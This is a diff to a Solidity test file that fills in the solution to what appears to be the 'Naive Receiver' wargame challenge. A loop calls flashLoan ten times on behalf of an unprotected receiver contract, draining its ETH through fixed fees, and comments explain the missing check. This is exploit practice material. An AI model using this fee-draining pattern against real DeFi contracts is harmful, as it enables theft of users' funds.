@@ -48,7 +48,13 @@ contract NaiveReceiver is Test {
         /**
          * EXPLOIT START *
          */
-
+        // TODO : get all ETH from FlashLoanReceiver
+        // cause on FlashLoanReceiver receiveEther function ,it doesn't check the borrow amount of ETH
+        // so we can borrow 0 ETH then FlashLoanReceiver will pay fixed fee 1 eth to NaiveReceiverLenderPool
+        // do it 10 times then we can get 10 ETH to NaiveReceiverLenderPool
+        for (uint256 i = 0; i < 10; i++) {
+            naiveReceiverLenderPool.flashLoan(address(flashLoanReceiver), 0);
+        }
         /**
          * EXPLOIT END *
          */
